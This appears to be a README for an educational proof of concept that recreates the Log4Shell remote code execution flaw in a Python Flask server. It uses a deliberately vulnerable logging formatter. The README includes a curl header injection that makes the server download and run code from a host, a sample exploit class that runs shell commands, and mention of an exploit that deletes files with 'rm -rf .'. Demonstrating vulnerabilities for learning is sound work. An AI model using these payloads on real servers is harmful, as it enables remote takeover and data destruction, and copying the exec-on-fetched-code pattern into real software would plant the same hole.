# py4jshell
Simulating Log4j Remote Code Execution (RCE) [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) vulnerability in a flask web server using python's logging library with custom formatter that simulates lookup substitution on URLs. This repository is a POC of how Log4j remote code execution vulnerability actually works, but written in python. Instead of using `JNDI+LDAP`, `HTTP` protocol is used for exploit code lookup.

**Note 1:** Do not use this in production, this is a demonstration of RCE.

**Note 2** This is not a vulnerability in Python's logging library. We are writing a custom formatter for the logging library that simulates the inherit behaviour of Log4J library.

**Note 3:** The exploit code exploit/exploit2.py executes rm -rf . in the server's present working directory, if you want to try this, make sure you are running it inside a container and not directly on the host, as it may result in data loss.

### How this works?
1. A GET request is made to the flask web server (`/hello`) from a HTTP client.
2. Flask framework invokes the logger to log this request, including the header.
3. Since we have patched the python's logging library to use our own formatter, the `format()` method implemented by our formatter `ShellishFormatter` is invoked.
4. The formatter performs original formatting and invokes `check_substitute_pattern` function which scans the string to be logged for `${{.+?}}` pattern.
5. If found, the URL inside this pattern is extracted, parsed and a HTTP GET request is made to the remote code hosting server pointed by the URL to download the exploit python code.
6. A runnable python object is constructed from the downloaded code dynamically using `exec` and `eval` interpreter methods. This object contains the executable exploit code.
7. Since we need to substitute the `${{.+?}}` with the stringified result, we call `str()` over the object which calls `__str__()` method of the exploit object.
8. Anything that is written inside the `__str__()` method is blindly executed unless it returns a string at the end.

### Try it yourself:
#### 1. Build the docker image:
First, built the docker image of the flask server using the provided Dockerfile.
```
docker build . -t py4jshell
```

#### 2. Host the exploit code locally:
The directory `exploit/` contains two sample python exploit codes. You can host these exploits anywhere on the internet, you can also do it locally by running a static HTTP server from that directory, as:
```
cd exploit
python -m http.server 8080
```
If everything is alright, you should see this message:
```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

#### 3. Start the container:
You can just open another terminal or anywhere in your local network, just start the server as follows:
```
docker run --rm -p 5000:5000 py4jshell
```
The container should start the web server, you should see the following message:
```
* Serving Flask app 'app' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://172.17.0.2:5000/ (Press CTRL+C to quit)
```

#### 4. Make get requests:
You can use curl or any other tool to make the GET request. Check `exploit1.sh` and `exploit2.sh` files.
You can also formulate your own request as follows:

```sh
HEADER_VAL="\${{http://192.168.0.104:8080/exploit1.py}}"

curl -X GET -H "Agent: ${HEADER_VAL}" \
    http://localhost:5000/hello
```
Note the header value for `Agent` field, it contains a URL from where the exploit code is downloaded.
If everything works fine, the server will download and execute the exploit code without complaining. You should see the output as below:
```
172.17.0.1 - - [17/Dec/2021 12:56:25] "GET /hello HTTP/1.1" 200 -
it worked!
Headers: Host: localhost:5000
User-Agent: curl/7.74.0
Accept: */*
Agent: Substituted text


172.17.0.1 - - [17/Dec/2021 12:56:44] "GET /hello HTTP/1.1" 200 -
```
As you an see there is `it worked!` message on the `stdout`, which is actually from the exploit code which runs `os.system("echo it worked!")`, check `exploit/exploit1.py`. Also, if you see the logs of the static http server which hosted the exploit code files, you should see:
```
172.17.0.2 - - [17/Dec/2021 18:26:44] "GET /exploit1.py HTTP/1.1" 200 -
```
Which indicates that there was a hit from the container to the static server to download the exploit code to perform remote code execution.

#### Passing parameters:
The sample formatter also supports passing custom parameters as arguments to the instantiated remote object, to pass parameters, you can encode them as GET URL parameters:
```
HEADER_VAL="\${{http://192.168.0.104:8080/exploit2.py?name=Prasanna}}"
```

Then in the exploit code you can receive them in the constructor:
```python3
class LogSubstitutor:
    def __init__(self, **kwargs) -> None:
        # do creepy things here.
        os.system("echo from constructor")
        self.name = kwargs.get("name", "NoName")

    def __str__(self) -> str:
        # the loader will call str(object) during substitution
        # so this method must written a string and we can do other
        # creepy things here as well.
        # LoL! don't run this on the host machine.
        os.system("echo rm -rf .")
        return "Hi {}".format(self.name)
```

### Notes:
1. This project is for educational purposes, it can be used to understand Remote code execution and how Log4j shell actually works and what makes it so dangerous.
2. This has nothing to do with python's original logging library as it does not perform any string substitutions by downloading and executing code from remote URLs, this functionality is purely implemented inside the custom formatter which is actually vulnerable.
3. Log4j uses JNDI + LDAP which is the way of performing lookups on remote Java objects. This method has been in practice since 1990 and has been used by lot of applications to solve some usecases. The actual LDAP + JNDI might not work exactly as how we have written the functionality in this repo, this is just a simulation.
4. Every interpreted language can be tricked into attacks like this if they expose some or the other way of dynamic code execution using `eval`, which is most common in many interpreted languages. It is left to the developers to write better code and make the world safer.
